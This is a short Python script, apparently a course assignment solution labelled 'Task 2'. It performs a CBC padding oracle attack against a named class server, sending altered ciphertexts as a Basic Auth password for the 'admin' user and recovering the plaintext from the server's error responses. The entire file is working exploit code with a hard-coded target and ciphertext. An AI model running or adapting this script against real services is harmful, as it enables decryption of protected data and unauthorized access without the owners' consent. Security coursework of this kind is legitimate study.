# Task 2

import requests
from requests.auth import HTTPBasicAuth


# Checking padding using a get request
def check_padding(url, username, password):
    auth = HTTPBasicAuth(username, password)

    try:
        status_code = requests.get(url=url, auth=auth, timeout=10).status_code
    except:
        return False
    
    return False if status_code == 500 else True


# Split the hex ciphertext into *blocks size* blocks and return a list of bytearrays elements
def blocks_split(ciphertext_hex, block_size):
    byte_string = bytearray(ciphertext_hex)
    return [byte_string[i:i+block_size] for i in range(0, len(byte_string), block_size)]


# Padding oracle attack
def padding_oracle(url, username, ciphertext):

    ciphertext_hex = bytes.fromhex(ciphertext)

    block_size = 16

    # Calculating total blocks
    total_blocks = len(ciphertext_hex) // block_size

    # Splitting blocks in a list of bytearray elements
    blocks = blocks_split(ciphertext_hex, block_size)

    # Final plain text in bytes
    plain_text_bytes = b''

    # Iteration on all blocks in reverse order
    for i in range(total_blocks - 1, 0, -1):
        
        # We need current block and also the previous block
        current_block = blocks[i]
        decrypting_block = current_block.copy()

        prev_block = blocks[i - 1]
        
        prev_changing_block = bytearray(prev_block)
        
        # Iteration for every byte of the block in reverse order
        for j in range(block_size, 0, -1):
            padding = block_size - j + 1

            # Testing values from 0 to 255 for every byte of the block
            for k in range(0, 256):

                prev_changing_block[j - 1] = k
                
                modified_ciphertext_hex = (prev_changing_block + current_block).hex()

                # Check if padding is correct using the modified block + current block
                if check_padding(url, username, modified_ciphertext_hex):
                    
                    # Calculate the plaintext byte
                    intermediate_x = prev_changing_block[-padding] ^ padding
                    decrypting_block[-padding] = intermediate_x ^ prev_block[-padding] 

                    # Updating the *changing previous block* for the next iteration of testing values (next byte [0, 255])
                    for z in range(1, padding + 1):
                        prev_changing_block[-z] = (padding + 1) ^ decrypting_block[-z] ^ prev_block[-z]
                    
                    break

        # Concat the plain text of the block (bytes)
        plain_text_bytes = decrypting_block + plain_text_bytes
    
    # Decode plain text in utf-8
    return plain_text_bytes.decode('utf-8')



if __name__ == '__main__':

    url = 'http://project-2.csec.chatzi.org:8000/'

    username = 'admin'
    ciphertext = '8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96'

    plain_text = padding_oracle(url=url, username=username, ciphertext=ciphertext)

    print(f'Plain Text: {plain_text}')
